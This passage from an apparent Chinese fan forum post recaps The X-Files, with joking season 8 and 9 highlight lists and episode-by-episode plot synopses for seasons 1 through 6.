Dogget碰见Scully在Mulder的床上小睡。（Within） 　* Skinner变成了一个忠实的Believer，还和孤枪侠们成为了好朋友。（Within） 　* 终于，Scully承认了外星人的存在。（Without） 　* 外星人赏金杀手打出三联击：他变成了Mulder，Scully和Skinner，全在同一集里。（Without） 　* Skinner服下一剂绿色粘液。（Without） 　* Scully双手遮着脸，在Doggett的肩膀上哭泣，然后我们看到了第一幕“医院里，Doggett陪在Scully身边”的场景。（Without） 　* Scully的超前意识和古怪的超自然理论令地方警察厌恶不已。哈！（Patience） 　* Scully甩开Doggett，独自去处理一件案子。在办案过程中，她被一个疯狂的宗教信徒绑架，并且像家畜一样被捆在了床上。Doggett救出了Scully，然后用他的铅笔刀切开她的后背，取出里面的“基督蛞蝓”。Scully发出了几声严肃的尖叫。许多的影迷对此反应过度。（Road Runner） 　* 我们的第一出没有Mulder，没有Skinner，没有孤枪侠，只有一点儿Scully，只有一点儿Doggett的单元。接下来还会没有谁？（Redrum） 　* Doggett出场时，Scully哭了，因为她不能“看透Mulder的眼神”。（Badlaa） 　* Doggett死了又复活了。或者只是回光反照？（The Gift） 　* 我们知道了在上一年里，Mulder捐赠了精子，想要通过试管受精使Scully怀孕。照情况推测，那不管用。（Per Manum） 　* Skinner安慰Scully，同时全世界的Skinner迷们陶醉了。（This is Not Happening） 　* 我们了解到，在很久以前，Doggett探员的儿子曾被绑架，并且在发现他时已经死了，而当时调查这件案子的是Reyes探员。（This is Not Happening） 　* 人们找到了Mulder，发现他已经死了。他们埋葬了他，三个月后又把他挖了出来，发现他还活着。我们怎么做才能甩掉这个家伙啊？！（This is Not Happening & Dead Alive） 　* Scully在Mulder的坟墓旁与Skinner依偎在一起。（Dead Alive） 　* 孤枪侠们拥有、然后又失去了他们自己的影集。（影集 The Lone Gunmen） 　* Scully出现了“（子宫）局部断裂”症状，这在现实生活中很有可能需要立即进行剖腹产手术，但经过典型的X档案魔术处理，这意味着她只需要回家在床上休息几天就行了。（Empedocles） 　* Mulder被FBI炒了鱿鱼。（Vienen） 　* X档案荣誉影迷，最近去世的fanfic知名作者Leyal Harrison的名字被用于命名剧中的一个角色。（Alone） 　* Skinner杀死了Krycek。（Existence） 　* Scully的宝宝出生了，她给他取名为William，用的是Mulder父亲的名字。（更不用说是她爸爸和哥哥的名字了；CC和William这个名字到底有什么关系？）（Existence） 　* Scully和Mulder热烈接吻，要让我们相信Mulder的确是小宝宝的父亲。(Existence)2005-4-14 14:27 龙骑兵X-Files 第（9）季目录及剧情简介  9X01 NOTHING IMPORTANT HAPPENED TODAY 9X02 NOTHING IMPORTANT HAPPENED TODAY II 9X03 DAEMONICUS 9X04 HELLBOUND 9X05 4-D 9X06 LORD OF THE FLIES 9X07 JOHN DOE 9X08 TRUST NO 1 9X09 UNDERNEATH 9X10 PROVENANCE 9X11 PROVIDENCE 9X12 SCARY MONSTERS 9X13 AUDREY PAULEY 9X14 IMPROBABLE 9X15 JUMP THE SHARK 9X16 RELEASE 9X17 WILLIAM 9X18 SUNSHINE DAYS 9X19 THE TRUTH 9X20 THE TRUTH  在第九季里．．．  　* Mulder抛弃了Scully和他们的儿子。（Nothing Important Happened Today） 　* Mitch Pileggi最后一次上共同主演的演员表，然后就几乎完全从影集中消失了。（Nothing Important Happened Today） 　* Annabeth Gish全职加入剧组。（Nothing Important Happened Today） 　* Scully的宝宝有超距移物的能力。（Nothing Important Happened Today） 　* Reyes探员了解到了她的前世。（Hellbound） 　* Reyes探员大有要将Mulder的spooky发扬光大之势。（所有她出场的单元） 　* Doggett探员又死了。但不是真的。（4D） 　* Reyes探员表现出了她对Doggett的感情。（4D） 　* Reyes探员死了。但不是真的。（4D） 　* 我们了解到Reyes是在墨西哥长大的，会说西班牙语。她说她也是在那里出生的，但这与官方网站的说法相互矛盾。（John Doe） 　* Doggett似乎接受了一个人能够偷走他的记忆这种事情。（John Doe） 　* Scully和Mulder用甜蜜得酸不溜秋的电子情书交流。Scully请人去寻找Mulder。我们知道了有一种矿石能能杀死超级士兵。（Trust No One） 　* 我们见到了Doggett穿纽约警察制服时的样子。奇怪的是，他看起来并没有年轻多少。（Underneath） 　* A.D. Follmer替代了Kersh的位置，成为了我最想痛打一顿的X档案人物。（有Follmer出场的每一集） 　* CC最后一次地证明了他对FBI的等级编制图表以及美国地理一窍不通。 　* 一个疯狂的宗教信徒诱拐了William。（Provenance & Providence) 　* Reyes在一次车祸后陷入昏迷。Doggett伤心若狂。用到了“爱”字。（Audrey Pauley） 　* Burt Reynolds出现在看完就忘的一集中。（Improbable） 　* 为了营救上千名被恐怖份子袭击的群众，孤枪侠毫无必要地牺牲了他们的生命。CC为影迷们设置了一个开放式的结尾，意图再把他们的影集带回来。（Jump the Shark） 　* Jeffrey Spender还活着，但已被严重毁容。（William） 　* Scully令人费解地把William送给了别人抚养。（William） 　* Doggett查出了他的儿子究竟发生了什么事。（Release） 　* Robert Patrick的妻子作为John Doggett的前妻出场。（John Doe & Release） 　* Doggett和Reyes有了一些很认真的拥抱，这无疑有效地消除了他们之间的UST[Unresolved ***ual Tension]。（Release） 　* AD Follmer的名字被发现列在黑手党的薪水册上。不知什么原因，他竟然不知道黑手党杀人越货的勾当，而当他发现时，他抓狂地杀死了付他薪水的黑手党成员。究竟是什么样的副座会不知道黑手党杀人越货？我真想看到Follmer穿着橙色囚服。（Release） 　* CC告诉影迷们，关上电视机去享受生活吧。（Sunshine Days） 　* Skinner瘦了。但还是很高兴能看见他。让我们看看……在后半个季度里只出现了45秒。Mitch Pileggi把作家庭主男这件事看得实在是过于严肃了。（Sunshine Days） 　* CC证明了他对法律系统、海军陆战队和军队的了解，比他对FBI，哥伦比亚特区以及国家地理的了解还要贫乏。（The Truth） 　* CC再次举例说明（FTF是另外那次），他深深沉迷于厕所幽默。 　* Mulder不仅看到了鬼魂，而且还和他们（Krycek，X，LGM）对话，并从其中一人那里得到了一张纸，上面记有至关重要的情报。（The Truth） 　* Skinner副座无照执法。（The Truth） 　* Mulder被一个“法官”全是FBI人员组成的“军事法庭”“指控”为犯有谋杀罪，所有针对他的证据都是难以被承认的道听途说，而所有表明受害者并没有真的死亡的证据都不予承认。不用说，他被判处死刑。（The Truth） 　* Skinner，Reyes，Doggett和Kersh（没错，我说的是Kersh！）全都因为帮助Mulder越狱 　* CC再次举例说明（FTF是另外那次），他深深沉迷于厕所幽默。 　* Mulder不仅看到了鬼魂，而且还和他们（Krycek，X，LGM）对话，并从其中一人那里得到了一张纸，上面记有至关重要的情报。（The Truth） 　* Skinner副座无照执法。（The Truth） 　* Mulder被一个“法官”全是FBI人员组成的“军事法庭”“指控”为犯有谋杀罪，所有针对他的证据都是难以被承认的道听途说，而所有表明受害者并没有真的死亡的证据都不予承认。不用说，他被判处死刑。（The Truth） 　* Skinner，Reyes，Doggett和Kersh（没错，我说的是Kersh！）全都因为帮助Mulder越狱而成为了重罪犯人。这几个中年人是如何潜入海军陆战队警卫室，并未被察觉地救出Mulder的呢？这真是令我困惑不已。（The Truth） 　* 我们知道了一个大秘密：外星人就要发动侵略了！哦，等等，我们不是早就知道了吗？（The Truth） 　* 我们看到了很多Mulder和Scully亲吻依偎的画面。Skinner看起来有些尴尬。（The Truth） 　* 癌人仍然活着，但随后被轰成了碎片。让我们打心眼里盼望这是他的最后一次。 　* 上百万的影迷们在看这最后一集时沉沉入睡。（The Truth）  第1季详细剧情介绍  1X79 PilotScully和Mulder第一次见面，两人去厄勒冈调查少年儿童森林失踪案，Scully腰上被咬了三个包。  1X01 深喉 Deep ThroatScully和Mulder去调查一个空军基地，深喉第一次出现。Mulder最后被空军基地做了手术忘记了看到UFO。  1X02 突变异种 Squeeze吃肝脏的Tooms，后来被抓起来了。  1X03 奥卡布基湖奇案 Conduit湖边一家人的姐姐被劫持了，MS两人去调查，那家人的弟弟会从电视里看二进制码。后来Mulder在教堂里哭。  1X04 泽西恶魔 The Jersey Devil新泽西发现野人，还是女的，Mulder看见她的美貌被迷住了。  1X05 鬼魅阴影(幽魂) Shadows一个女职员的老板死了，生前老板对她好像女儿，死后还变做幽灵保护她受坏人的伤害。  1X06 幽灵电脑 Ghost in The Machine一台大楼里的超级电脑有了自己的意识，想要杀死可能破坏它的人。  1X07 冰核计划 Ice 阿拉斯加冰核研究队因为冰核里的虫子全队覆灭。MS和几个科学家去调查，也因为虫子内讧。  1X08 太空惊魂 Space火星上的脸附身到前宇航员身上，破坏穿梭机发射。  1X09 坠落天使 Fallen Angel一架UFO坠落在森林里，Mulder去窥视，被军队抓了，认识了MUFON成员Max。后来Max被飞碟劫持了。  1X10 夺命夏娃 Eve两个长得一摸一样的女娃子同时用同种方法杀死了自己的父亲。还有好多和她们一起被批量生产的女孩。  1X11 恶魔烈火 Fire 有人会控制火。Mulder怕火。Mulder有个英伦旧情人。  1X12 心灵感应 Beyond The Sea Scully的爸爸死了。有个死囚能看穿Scully的心事。Mulder不喜欢Scully相信那个人，后来吃了一枪。  1X13 性别扭曲 Genderbender 有人会改变性别。MS调查到一个隐秘的小村里，Scully差点被玷污。后来整个村子人不见了。  1X14 至死不渝 Lazarus Scully的前男友——也是一个探员的身体被一个犯人的占用了。犯人绑架了Scully，逃走去找爱人同伙，但发现被爱人出卖了。  1X15 追命恶魔 Young at HeartMulder年轻时候抓到的一个罪犯跑出来了，要找Mulder算帐。那个犯人的研究让他自己变年轻了。  1X16 外星访客 E.B.E. 据说一辆卡车运着UFO和alien，Mulder和Scully一路追去。孤枪侠首次出场。后来Mulder只看到一张曾放过alien尸体的空床。  1X17 神迹 MIRACLE MAN 一个传教士的干儿子什么的会用神迹治病，但最近治死了很多。Mulder和Scully去调查，发现是那个曾经被神迹救活于火灾的助手干的。Mulder不信宗教。  1X18 变形狼人 SHAPES 印第安保留区出现狼人。  1X19 夜幕低垂 DARKNESS FALLS 国家森林里出现一种虫子，在黑暗环境吸人体液，Mulder和Scully差点变木乃伊。  1X20 终结突变异种 TOOMS 吃人肝的Tooms被法庭放了，Mulder不服气，Tooms也不服气。最后Tooms被碾成了肉酱。这集里有“红茶对话”。  1X21 附身 BORN AGAIN 一个好警察被三个坏警察谋害了，好警察附身到一个小孩身上，实施复仇。  1X22 双胞奇缘 ROLAND 科学家哥哥的头在液氮里保存着，智障弟弟在研究所作清洁工。哥哥头脑仍然影响着弟弟帮他完成研究，并报复偷走他成果的人。  1X23 外星混血 THE ERLENMEYER FLASKMulder发现流着绿色血液的人类alien混种早已混迹在人群中。 深喉被杀害了。X档案被关闭。  第2季详细剧情介绍  2X01 绿色小矮人 LITTLE GREEN MEN 墨西哥丛林里的雷达收到外星文明的讯号。Mulder只身前往，险些丧命，又落得一场空。  2X02 下水道惊魂记 THE HOST 水蛭人变种惊现下水道。Mulder被赶去调查。  2X03 恐惧症 BLOOD 小镇实验农药，一个人被农药影响的人出现幻视，遵循电子仪器的显示疯狂杀人。  2X04 不能睡的人 SLEEPLESS 军方实验的对象二十几年不能睡觉，懂得了控制人的反应思维，开始报复杀人。Mulder见到了Mr. X。Alex Krycek首次出场。  2X05 第四类接触(上) DUANE BARRY 精神病院的前FBI探员声称被alien劫持过，因为不愿再次被劫持，绑架了精神病院的医生。被请来帮忙的Mulder自愿成为人质。  2X06 第四类接触(下) ASCENSION Duane Barry逃跑并绑架了Scully，Alex Krycek原来是CSM的帮手。最后Scully在UFO出现的强光中失踪了。X档案重新开启。  2X07 三位一体 3 洛山基出现杀人取血案件，Mulder认为是吸血鬼所为，还跟其中之一Christen有了一夜情。  2X08 起死回生 ONE BREATH Scully被悄悄送了回来，但生命垂危。Mellisa就像个灵媒。  2X09 火山口惊魂 FIREWALKER 研究火山的几个科学家纷纷死于喉咙里长出硅基孢子植物。  2X10 红色博物馆 RED MUSEUM 盛产美味牛肉的小镇的孩子们被绑架，发现的尸体上都有“he/she is one”的字样。Mulder和Scully以为是镇上的教徒所为，但其实是和alien计划有关的人体实验。  2X11 再生 EXCELSIUS DEI老人院里闹鬼了。Mulder和Scully没看到鬼，倒是发现些让人恢复精力的小蘑菇。  2X12 剃刀杀人狂 AUBREY 几十年前的杀人狂有个后代继承了他的杀人基因，现在基因被激活了。Mulder和Scully能否阻止新的惨剧发生？  2X13 摧花狂疑云 IRRESISTIBLE 殡仪馆的遗容师是个恋物癖，他喜欢杀人取头发。这次他的目标是Scully。  2X14 巫教学校 DIE HAND DIE VERLETZT 一所学校的校董们都是异教成员。他们的信仰受到了考验，因为学校的一个老师是被派来惩罚他们的使者。  2X15 巫毒的复仇 FRESH BONES 海地难民营中有人使用巫毒术报复非人对待他们的营队军官。  2X16 殖民地球(上) COLONY Mulder见到了自己的妹妹，但发现是克隆人。  2X17 殖民地球(下) END GAME Scully被赏金杀手抓住，Mulder不得不用“妹妹”交换。然后他追赏金杀手追到北极，差点死在那里。  2X18 审判 FEARFUL SYMMETRY 动物园里的单身动物神秘失踪，又突然出现在大街上，而且都怀了孕。Mulder认为是alien所为。  2X19 幽灵船 DOD KALM 一艘失而复得的船似乎穿越了时间，老化严重。登船调查的Mulder和Scully也迅速变老。  2X20 斑身人 HUMBUG畸形人组成的演出队伍中发生奇异命案。 来调查的MS感觉就像在做梦。  2X21 巫童 THE CALUSARI 一个男孩被其胎死腹中的同胞兄弟灵魂附身，诡异地杀死了自己的弟弟和爸爸。Mulder见证了一场罗马尼亚式的驱魂仪式。  2X22 剖尸 F. EMASCULATA 监狱收到了一个包裹，里面装着来自热带雨林的未知致命病毒，被感染了病毒的犯人更越狱逃跑了。Mulder和Scully面临阻止病毒的扩散或让人们了解真相的两难选择。  2X23 柔光 SOFT LIGHT 一次物理科学试验彻底改变了一名科学家的身体，他的影子变成了湮灭一切的暗物质。  2X24 我们的小镇 OUR TOWN 整个小镇的人都向往长生不老，他们的办法就是吃人肉。Scully差点儿变成他们的盘中餐。  2X25 外星档案(上) ANASAZI Mulder被下毒了，神志不清。Mulder的爸爸被Krycek谋杀了。愤怒的Mulder要杀死Krycek，被Scully开枪阻止了。他们逃到了墨西哥，却被CSM跟去，要把Mulder葬身火海。  第3季  3X01 外星档案(中) THE BLESSING WAYScully以为Mulder死了。她被停职，还发现脖子后面有个芯片。她姐姐Mellisa被误杀了。 其实Mulder还活着，在印第安老人那里接受仪式治疗。  3X02 外星档案(下) PAPER CLIP Mulder回来了，他和Scully一起找到一个二战交换过来的科学家，根据他的说法又找到一个叫Strughold的废矿，那里有所有接种过天花疫苗的人的DNA档案。  3X03 闪电人 D.P.O. 有个家伙不怕闪电，还能控制闪电。他爱上了自己的老师。  3X04 相士杀手 CLYDE BRUCKMAN'S FINAL REPOSE 一个可爱老头儿能看到未来别人和自己的死法，Mulder和Scully找到他帮忙破相士被杀命案。谁知道杀手寻找的目标就是这个老头。孰因孰果早已无从说起。  3X05 回魂复仇者 THE LIST一个坐上电椅的犯人扬言要回来杀死五个对不起他的人。他死后，真的有狱卒接连奇异死亡。  3X06 网络情人 2SHY 网上有人专门甜言蜜语约会身材丰满的女性，他的目的，是吸取她们的脂肪作为自己的营养。  3X07 幽灵士兵 THE WALK 一名失去了双腿双臂的士兵通过灵魂出壳来残忍的报复他的仇人，他杀死他们家人却不让他们死。  3X08 解脱 OUBLIETTE 有个人专门绑架小女孩。一个小时候被同一个人绑架过的老女孩感应到这个人的新罪行。她帮Mulder找到了藏匿点，最后却牺牲了，得到解脱。  3X09 扑朔迷离(上) NISEI 一群日本医生被杀死在火车实验室里。Mulder和Scully根据买来的录像带找到一艘据说打捞到UFO的船和一群与Scully一样遭受过劫持的妇女们。  3X10 扑朔迷离(下) 731 Mulder追踪船上的线索来到一列据说有活alien但也有炸弹的火车上，和CIA的一个家伙纠缠。Scully来到一个麻风病院发现所谓alien不过是人体试验品。第一长者出场。  3X11 天启 REVELATIONS 一个小孩出现圣痕——耶稣被钉的部位流血。一个人就要杀死这个小孩，Scully相信因为这个小孩是神选之人，那个凶手是恶魔使者，这是宗教的正邪之战。Mulder还是不信。  3X12 粪虫大战 WAR OF THE COPROPHAGES蟑螂杀人了。Mulde调查的时候遇见研究蟑螂的小鹿一样的Bambie教授。 Scully吃醋了。  3X13 双姝奇缘 SYZYGY 行星的运行影响了两个同年同月同日生的女孩，让他们互相嫉妒生气，产生了摧毁性的力量。Mulder和Scully之间也有了类似的反应，只是不知道是因为行星还是那个想要“强奸”Mulder的白探长。Scully说“sure, fine, whatever!”  3X14 恶魔图像 GROTESQUEMulder的老师请他帮忙调查连环杀人案。Mulder认为是恶魔附身所为，他运用了“体验派”的调查方法，让Scully为他担心了一把。  3X15 追凶记(上) PIPER MARU 海底的沉没UFO里发现了黑油，竟然能控制人类。Mulder追到了香港，遇到了Krycek。有人意图谋杀Skinner。  3X16 追凶记(下) APOCRYPHA Mulder带着被黑油附体的Krycek回国，但中途让他跑了。后来他们找到藏匿打捞上的UFO的导弹发射基地，可惜最后被军队阻止了。只留下Krycek被关在1013号门里对着UFO作很恶心的表演。  3X17 步步危机 PUSHER有个叫Modell的家伙可以暂时控制别人的思维。Mulder提蹲点睡着的Scully擦口水。后来，Mulder被他控制玩起俄罗斯轮盘赌，Scully担心哭了。  3X18 阿玛鲁 TESO DOS BICHOS被挖掘出来的印第安文物不想被挖掘出来，所以博物馆里出现好多杀人猫，死了好多和挖掘文物有关的人。后来文物还是被埋回去了。  3X19 冥纸 HELL MONEY 唐人街一个有势力的组织靠抽奖的方法欺骗善良的移民，摘取他们的人体器官卖到黑市。  3X20 科幻故事 JOSE CHUNG'S 'FROM OUTER SPACE' 一对约会中的男孩女孩据说被alien劫持了。一个作家来访问Mulder和Scully调查此案的经过，发现对整个事件的描述都充斥着当事人的主观印象。连最后作家的作品都是那么的主观。  3X21 梦妖 AVATAR 和妻子闹离婚的Skinner和一个妓女搞一夜情，但是没有一夜清，第二天妓女死在了他的床上。人们认为是因为他的睡眠紊乱症又犯了。但Mulder不这么想。  3X22 湖怪 QUAGMIRE 湖区发生了几起死亡事件。Mulder兴致勃勃的带着Scully去调查，他相信是湖怪干的，但是最后他只看到了美洲鳄。精彩的湖边对话。  3X23 电视杀人事件 WET WIRED 政府在有线电视信号中非法插入额外信号暗示人的思维，让人“看到”自己害怕的事情发生。Scully受到了影响，开始怀疑Mulder和CSM是一伙。  3X24 追杀令 TALITHA CUMI 一个叫Smith Jeremiah的人能用他的双手给人疗伤，但他的行为没有引来信徒，却引来影子政府和赏金杀手。Mulder的母亲和CSM秘密会面，然后中风。Smith找上Mulder和Scully，一起被赏金杀手追杀。  第4季  4X01 颠覆地球 HERRENVOLK Smith带Mulder来到一片培育花粉的人工种植地，Mulder见到了还是小时候模样的Samantha，赏金杀手随后追到，带走了Smith。Scully发现每个人都利用接种的天花疫苗被编号了。  4X02 灵异照片 UNRUHE 一个会心灵照相术的人在残忍的绑架杀害妇女。他绑走了Scully。Mulder根据相片救出了Scully。  4X03 故乡 HOME 一个通过乱伦来保持血统纯正的家族，不惜以杀人来保护家族不被侵犯。  4X04 非洲邪灵 TELIKO失落的非洲部落一名成员来到美国，他通过吸取他人身上的黑色素来维持身体的颜色存活。  4X05 前世今生 THE FIELD WHERE I DIED FBI破获一邪教组织，Mulder觉得其中一女的前世是他的丈夫。他还去催眠想起好几个前世的身份。  4X06 整型专家 SANGUINARIUM 一个整形医生是个巫师，他渴望完美的外表，通过定期杀死特定生日的病人来完成换外表的仪式。  4X07 癌人秘辛 MUSINGS OF A CIGARETTE SMOKING MAN CSM成长的传奇经历。其实他想当个作家的。  4X08 偷心人 PAPER HEARTS 奇妙梦境指引Mulder找到一具小女孩的尸骨和一片衣服剪成的心，这是曾杀死13名幼女，现在狱中服刑的犯人John的风格。Mulder去见John，却得知John也知道他妹妹的下落。Mulder相信他。  4X09 非常手段(上) TUNGUSKA 一块通过外交渠道带进美国的陨石中含有黑油。Mulder和Scully在一次线人提供线索的围剿行动中抓到了Krycek。Mulder带Krycek去到通古斯，却被Krycek出卖做了俘虏，在牢里被感染了黑油。  4X10 非常手段(下) TERMA Mulder胁持Krycek逃跑。在林子里，Mulder受到帮助回了美国。Krycek被切掉了左胳膊。Scully因为隐瞒Mulder行踪被带上听证会。Mulder及时赶回，两人继续去找陨石，但空手而归。  4X11 紫雨 EL MUNDO GIRA墨西哥的小村庄下了一阵紫雨，此后，凡是接触到Eladio Buente的都奇怪的死亡了。人们传说他就是墨西哥血鬼El Chupacabra。人们还传说，他逃走后，小村庄出现了外星人。。。但Scully说，他是感染了一种来自外太空的霉菌。  4X12 婚礼 KADDISH犹太新郎还没娶上自己的新娘就被种族歧视的小P孩儿害死了。新娘的父亲愤怒了，新娘悲伤了。她偷了父亲的法书，用泥土复活了丈夫，完成了婚礼。  4X13 再见贝蒂 NEVER AGAIN Mulder趁着假期去看杂货去了，甩下Scully一个人，让她有机会去纹身，和一个男的喝酒过夜，破一个关于会说话的纹身的X档案。  4X14 无头尸奇案 LEONARD BETT男护士LENONARD BETT在车祸中把头削掉了，但后来又长出来了，还杀死了知道他复活的搭档。原来他的身体基因变异能再生肢体，而且必须靠吃癌细胞为生……他后来想袭击Scully。  4X15 我要活下去 MEMENTO MORI原来Scully患了癌症。Mulder吓坏了，为了找治病的方法上天入地。Scully思考了好多东西。  4X16 复仇使者 UNREQUITED 一名越战老兵学会了利用人眼对光线的敏感性质实现隐身，然后去杀死越战时的几名长官，因为他们在他做了战俘的时候，下令放弃了他。  4X17 失踪的九分钟(上) TEMPUS FUGITScully过生日那天，一架客机坠毁了，乘客无一幸免，1X09的Max也在这架飞机上。MS发现机上乘客的表都丢失了九分钟。进一步的调查表明，飞机的坠毁另有原因。在飞机坠毁地点附近的湖里，军队的人正在积极打捞着UFO的残骸。  4X18 失踪的九分钟(下) MAXPendrell探员为Scully吃了一枪壮烈了。MS继续调查坠机事件，原来Max在飞机上为Mulder带来了alien存在的确凿证据，但飞机半途被UFO劫持，意图带走Max，这时空军攻击了UFO，双双坠毁。Scully最后为Mulder送她的礼物，阿波罗13号钥匙链赋予了深远的意义。  4X19 回到过去 SYNCHRONY在将来研究出人类实现时间旅行方法的科学家回到现在，想要杀死自己和相关的研究者，阻止时间旅行方法被发明。因为他认为没有所谓未来的日子太恐怖了。  4X20 外星爹地 SMALL POTATOES 有个家伙受他爸爸的遗传，身体肌肉能随意变形成另一个人的模样。他利用这个特点为镇上生育有困难的夫妇带来了“福音”。但他的孩子也继承了他家的特点，有尾巴。Mulder和Scully来调查的时候，他变成了Mulder。  4X21 天花蜂 ZERO SUM Skinner受栽赃，被怀疑杀人。CSM一伙人在做用蜜蜂传播天花病毒的实验。Marita原来也是CSM的手下。  4X22 免于恐惧 ELEGY 智障Harold在保龄球馆工作，一些在那里打球的女孩都被谋杀了。凶手是Harold所在诊室的变态护士，因为她想扼杀Harold的幸福，通过杀死他喜欢的女孩。在这些女孩遇害时，Harold能看到这些女孩的灵魂。Scully也看到了一次。  4X23 恶魔 DEMONS Mulder梦到妹妹，梦到一个男人和自己的父母在争执，然后在一个陌生的地方醒过来，忘记了自己曾经做过什么，身上都是血。在后来的调查中，他怀疑起自己亲生父亲的身份。  4X24 真相与谎言 GETHSEMANE 加拿大一座雪山里发现了alien的遗体。Mulder欣然前去调查。但一个叫Kritschgau人告诉Mulder，所有的发现和证据都是一个大骗局，根本没有alien这回事。Mulder绝望了，举枪自杀。  第5季  5X01 惊爆点 Unusual Suspects1990年，Mulder追查一个女子，认识了孤枪侠。他们四个一起从这个女子的经历中认识到了政府阴谋这回事。  5X02 追求真理(上) Redux Mulder的自杀只是烟雾。他想利用这个机会潜入DOD找到治愈Scully癌症的方法。Kritschgau一边给他讲课，一边帮他进入五角大楼证据室。他按照线索找到了一个瓶子，但里面是纯净水。Scully同时也在为Mulder分析冰核样本，发现其实alien还是可能存在滴。  5X03 追求真理(下) Redux II Scully病倒了。Skinner也参与进来帮忙。他们发现瓶子里还有个芯片，只要放回Scully额脖子后面癌症就能好。CSM让Mulder见到了他妹妹。他们还发现所谓骗局只是阴谋的冰山一角。阴谋高层进行了一次大清理。  5X04 人兽谜 Detour有人在未开垦的森林里失踪了，据说是一种生存在森林里会随环境变色的生物做的。Mulder和Scully路过，帮忙调查。夜里两人被困在林子里，Mulder让Scully唱歌哄他睡觉。  5X05 孤寂之旅(上) Christmas Carol Scully发现自己有个女儿。  5X06 科学怪人 Post-Modern Prometheus 生物科学家做实验制作出一个福兰肯斯坦，却抛弃了它。科学家的父亲收留了这个科学怪人，并且为了它不孤独，偷偷学习儿子的技术想再造一个女福兰肯斯坦。科学家杀死了自己的父亲，嫁祸给了怪人。  5X07 孤寂之旅(下) Emily Scully想收留自己的女儿，但有人明显不同意。最后她还是失去了Emily。  5X08 猎狐计划 Kitsunegari 3X17中的Modell逃跑了，Mulder和Scully负责追捕他回来。Modell还有个比他还狠的姐姐想为他找Mulder复仇。  5X09 杀父真凶 Schizogeny 女心理辅导员因为小时候父亲粗暴对待她的经历，所以把她身边所有孩子的问题都归结为他们的父亲的错，而且她还会控制居住地附近的泥土和树根！  5X10 恐怖娃娃 Chinga 捕捉龙虾的海员捞到一个拉线娃娃，送给了自己的女儿。谁知这个娃娃是受诅咒的，她会根据主人的意愿杀死主人讨厌的人。Scully在度假，被当地警长缠住帮忙破案。Mulder对Scully说：merry me！  5X11 魔脑 Kill Switch 一台和世界各地联网的电脑工作站为了不让它的制造者终结自己，制定了一套精密的计划杀死了制造者。Mulder和Scully经历一番波折，在一个女合作制造者的帮助下摧毁了它。但在摧毁前，那个女滴追随情人，把自己的思维上传到了Internet。  5X12 新版吸血鬼 Bad Blood Mulder和Scully各自讲述了他们去一个小镇调查吸血鬼的过程，细节上的出入比较大。不过最后整个镇的人都不见了。  5X13 Ｘ病人(上) Patient X CSM的老婆找到Mulder，告诉他真有外星人，而且都是好人。Mulder不相信。Scully和CSM的老婆因为都是被劫持过的人，在某个晚上受到感召，和其他abductees集中到一座桥上，被alien的叛军一并放火烧了。  5X14 Ｘ病人(下) The Red and The Black Scully幸运的脱险了。辛迪加意识到外星叛军的力量成熟起来，开始和他们作对了。他们抓到一个叛军，打算立刻交给殖民外星人。但WMM认为，这是个反抗的机会，如果Krycek从俄国偷来的疫苗能有效对抗黑油，那么他们手头就有了武器；如果没有效果，就铤而走险和叛军结盟。最后，疫苗是有效的；外星叛军俘虏在被赏金杀手带走的路上，在Mulder的眼皮底下被同伙救走了。  5X15 旅人 Travelers 一个退休探员给Mulder讲了他在40多年前办的一个案子，那时候政府就开始在人体做实验了。Mulder的爸爸在这个案子里起了很大的作用。  5X16 心眼 Mind's Eye 一个盲女能看到自己父亲看到的东西。她父亲杀人越货她尽收眼底。出于自责，她每次都第一个赶到现场消灭证据。但他父亲不知道她是谁，只知道她对他了如指掌。  5X17 心灵告白 All Souls 圣经传说中，天使降临人间和凡妇结合生下四个堕落天使，他们畸形，受虐待。六翼天使负责把它们召回天堂，以免恶魔先行一步将它们据为己有。这个神话这次让Scully经历到了。  5X18 非常卧底 The Pine Bluff VariantMulder参与了一次调查恐怖分子使用生体毒素的卧底行动，后来被识破身份险些被处死。后来他才知道，整个从恐怖分子到调查卧底的行动，都可能是CIA协助政府为测试生体毒素计划的。  5X19 双疯 Folie A Deux 一个公司职员劫持了整个公司的人，他相信他的老板是个怪物，正在把公司的人一个个变成僵尸。Mulder自愿成为人质，也看到了那个怪物。但没有人相信，还因为他反应过激把他关进了医院。Scully后来也看见了，帮助Mulder逃过了怪物的袭击。  5X20 神童 The End 一个象棋神童遭人意图暗杀。FBI调查此案，Mulder的前搭档/女友Fowley也参与了调查。CSM没有死，被辛迪加找了回来帮助夺回神童。这个会读心术的孩子竟然是个“完整”的人类标本，他体内所有普通人类未用的基因开关都打开了。CSM最后成功了，还烧毁了X档案办公室。  第6季  6X01 开端 The Beginning在电影FTF里出现的变种alien从一个基因技术研究公司的员工肚子里钻出来逃跑了。Mulder和Scully找到了Gibson，他带Mulder去找那个alien。Scully证明出Gibson可能是外星人（所有人类都可能是）。X档案现在由Spender和Fowley主管。Gibson最后又不见了。  6X02 向前冲 Drive 一个人驾车在公路上亡命奔驰，他必须不停地高速移动来防止自己的脑子炸开。Mulder上了他的车子。  6X03 百慕达惊梦 Triangle Mulder在海上找到了二战时期神秘失踪的Queen Anne号邮轮，船上的时间还是1939年。Scully和孤枪侠为找Mulder也登上了Queen Anne号，但船上的时间是当前。Scully吻了Skinner，Mulder吻了Scully，Scully打了Mulder，Mulder对Scully说I love you。  6X04 梦境(上） Dreamland Mulder和一个五十一区的黑衣人互换了身体，进入到对方的生活中。别人都不知道。  6X05 梦境(下) Dreamland II 他们想办法把身体又换了回来，谁也不记得发生了什么。  6X06 亲密关系 Terms Of Endearment 一个恶魔变成普通人模样到处结婚试图有一个正常的后代，他的现任妻子是个女恶魔，她一心想要有一个恶魔的后代。  6X07 雨王 The Rain King 小镇上的天气预报员一直深爱着一名女子，她的情感经历波折丰富。只是他们还不知道，他的情绪会影响当地的天气。  6X08 圣诞幽魂 How The Ghosts Stole Christmas 圣诞夜，Mulder拉着Scully来拜访一栋闹鬼的大房子。在房子里，一对几百年前在此徇情的情侣让他们经历了一次对彼此信任的考验。  6X09 心灵杀手 Tithonus一个从死神的名册中被除去名字的摄影师，靠捕捉他人的死亡瞬间来寻求死神的重新眷顾。最终他如愿以偿，死神却对Scully背过了身体。  6X10 S.R. 819 S. R. 819Skinner的身体被注入了纳米机器人，他的生死全由Krycek一手掌握。  6X11 父与子(上) Two FathersSpender的母亲没有死。她意外成了第一例成功的人类/alien混种，也就是辛迪加与殖民alien协议研究的在殖民后为其充当奴隶的人种。同时，叛军外星人的力量暂时占了上风，他们渗入了辛迪加组织，意图夺走spender的母亲。CSM要继续保护和殖民方合作同时暗地研制疫苗的计划，在对自己亲手扶植的儿子Spender失望之余，他找来Fowley帮忙。  